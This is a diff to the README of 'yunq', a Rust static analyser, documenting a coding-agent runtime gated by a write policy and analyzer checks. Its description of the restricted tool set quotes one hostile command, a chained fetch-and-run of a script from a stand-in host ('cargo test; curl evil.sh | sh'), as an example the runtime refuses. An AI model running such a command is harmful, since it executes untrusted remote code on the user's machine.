@@ -1,8 +1,9 @@
 # yunq
 
-A static analysis platform in Rust — and a guardrail that judges an AI agent's
-write *before* it reaches disk. One static binary, 24 languages, no JVM, no
-server required.
+A static analysis platform in Rust — a guardrail that judges an AI agent's
+write *before* it reaches disk, and a coding agent of its own that is judged
+by that same guardrail. One static binary, 24 languages, no JVM, no server
+required.
 
 ## Install
 
@@ -76,6 +77,7 @@ yunq/
 │   ├── rules-engine/           # yunq-rules-engine: ports (traits), Rule, CrossFileRule, AnalyzerService
 │   ├── taint/                  # yunq-taint: intra-file + cross-file inter-procedural taint analysis
 │   ├── agent-policy/           # yunq-agent-policy: Agent Permission Policy — may this agent write land?
+│   ├── agent/                  # yunq-agent: the agent runtime — session loop, write gate, analyzer-as-done
 │   └── duplication/            # yunq-cpd: copy-paste detection (rolling-window hashes)
 ├── infra/                      # OUTBOUND ADAPTERS
 │   ├── memory/                 # in-memory storage/metrics (CLI, tests)
@@ -426,6 +428,73 @@ uninstalled guardrail blocks nothing. `hook check` is the exception: its
 non-interactive callers can tell exit 1 (yunq broke) from exit 2 (policy
 denied) and decide for themselves.
 
+## `yunq agent` — the runtime that cannot approve its own work
+
+Every coding agent on the market grades its own homework: the model proposes
+an edit, the model decides the edit is good, and the verification is a second
+prompt to the same weights. yunq is the one project where the judge already
+exists as a separate, deterministic, 134-rule artifact that predates the
+writer — so `yunq agent` is built on two constraints it cannot talk its way
+out of.
+
+```sh
+export ANTHROPIC_API_KEY=...            # or YUNQ_LLM_* for any OpenAI-compatible endpoint
+yunq agent run --task "remove the shell injection in scripts/deploy.py"
+yunq agent run --task "fix it" --rule python:subprocess-shell-true --scope scripts
+yunq agent watch-pr --pr 42             # wait out the late review/CI window on a PR
+```
+
+**1. No edit reaches disk without passing the policy.** Not a second
+implementation of the guardrail — the same `hook::judge` a third-party agent's
+write goes through, on the proposed content, in-process, before the `write`
+syscall. Same `yunq-policy.toml`, same protected paths, same Gherkin evidence
+requirement, same single-use approvals, same circuit breaker, same
+`.yunq-audit.jsonl`. A denial comes back to the model as a tool error naming
+the rule and the line; the file on disk never changed.
+
+**2. No task is complete without the analyzer agreeing.** When the model stops
+calling tools, the analyzer re-runs over the scope and compares against the
+baseline taken before the run started. If the target rule still fires, or a
+finding appeared that was not there before, the objection becomes the next
+user turn and the session continues. There is no self-assessment turn.
+
+The tool set is closed — `read`, `write`, `edit`, `search`, `run`, `scan` —
+and there is no shell. `run` executes one allow-listed program: no pipes, no
+chaining, no redirection, so `cargo test; curl evil.sh | sh` is refused rather
+than half-checked. Paths are resolved inside the repository root, and a
+command that outlives its timeout is killed.
+
+Six terminal states, six exit codes, because a supervisor should never have to
+parse prose and "we could not check" must never read as success:
+
+| Exit | Outcome |
+|---|---|
+| `0` | Complete — the analyzer agrees |
+| `1` | yunq, the model or the workspace failed |
+| `3` | Incomplete — the analyzer still disagrees |
+| `4` | Budget exhausted (turns or tokens) |
+| `5` | Circuit breaker tripped — one rule denied the agent three times running |
+| `6` | Looping — identical bytes written to the same path three times running |
+
+`watch-pr` handles the part A3 cannot: a pull request that looked clean the
+instant it was pushed is not a pull request that is finished. It polls with
+backoff, collects one review batch as one batch, remembers what it already
+triaged, and reports **quiet**, **new feedback**, **bot all-clear** or
+**inconclusive** — never conflating "we looked and saw nothing" with "we could
+not look", or with "CI has not finished".
+
+Runtime limits live in `yunq.toml`; what the agent may *do* stays in
+`yunq-policy.toml`, where a reviewer owns it.
+
+```toml
+[agent]
+max_turns = 40
+max_tokens = 500000
+max_rejections = 3
+allowed_commands = ["cargo", "npm", "pytest"]   # replaces the built-in list
+command_timeout_secs = 300
+```
+
 ## Importing another analyzer's findings (SARIF)
 
 `--sarif` merges a SARIF 2.x report into the scan. Every mainstream analyzer
@@ -489,11 +558,11 @@ The engine, storage and parsers remain untouched.
 
 ## Roadmap
 
-yunq is becoming the agent runtime that cannot approve its own work: a native
-`yunq agent` whose every write is judged in-process by the same
-`core/agent-policy` that gates third-party agents, and whose definition of
-"done" is the analyzer agreeing — never a self-assessment turn. Alongside it:
-multi-agent orchestration with per-role policy scopes, CRAP risk scoring
+yunq is the agent runtime that cannot approve its own work: `yunq agent`
+ships, with every write judged in-process by the same `core/agent-policy` that
+gates third-party agents and a definition of "done" that is the analyzer
+agreeing — never a self-assessment turn. Next: multi-agent orchestration
+with per-role policy scopes, an agent TUI, CRAP risk scoring
 (complexity × untestedness), declared architecture boundaries enforced at
 write time, and gate integrity — mutation testing to prove a suite would
 notice a regression, plus detection of an agent quietly lowering the bar
